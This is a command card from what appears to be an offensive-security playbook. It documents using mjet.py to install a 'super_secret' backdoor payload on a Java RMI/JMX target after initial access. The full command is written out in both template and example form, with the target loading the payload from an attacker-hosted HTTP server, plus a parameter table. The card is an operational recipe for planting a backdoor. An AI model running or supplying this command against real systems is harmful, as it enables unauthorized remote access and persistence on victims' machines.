---
id: a4191385-4581-4414-a208-c0fe6f0da659
name: mjet-install-super-secret-payload-on-target
type: command
executor: bash
data: >-
  jython mjet.py $_TARGET_IP $_TARGET_PORT install super_secret
  http://$_ATTACKER_IP:8000 8000
output: null
created_at: '2023-04-06T03:56:00.890991+00:00'
updated_at: '2023-04-06T03:56:00.909312+00:00'
platforms:
  - Linux
tags:
  - exploitation
  - rmi
  - payload-install
verified: true
validated: true
---

# mjet-install-super-secret-payload-on-target

## Command

```bash
jython mjet.py $_TARGET_IP $_TARGET_PORT install super_secret http://$_ATTACKER_IP:8000 8000
```

## Description

Installs the 'super_secret' backdoor payload on the target using mjet.py after initial access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP | Yes |
| $_TARGET_PORT | Port | Yes |
| install | Action | Yes |
| super_secret | Payload name | Yes |
| http://$_ATTACKER_IP:8000 | Payload URL | Yes |
| 8000 | Server port | Yes |

## Examples

### Basic Usage

```bash
jython mjet.py 192.168.1.100 1099 install super_secret http://10.0.0.5:8000 8000
```

## Expected Output

"Installation complete."

## Related

- [[procedures/Exploit-Java-RMI-for-RCE-Using-Sjet-or-Mjet]]
- [[commands/mjet-deserialize-commonscollections6-for-rce]]
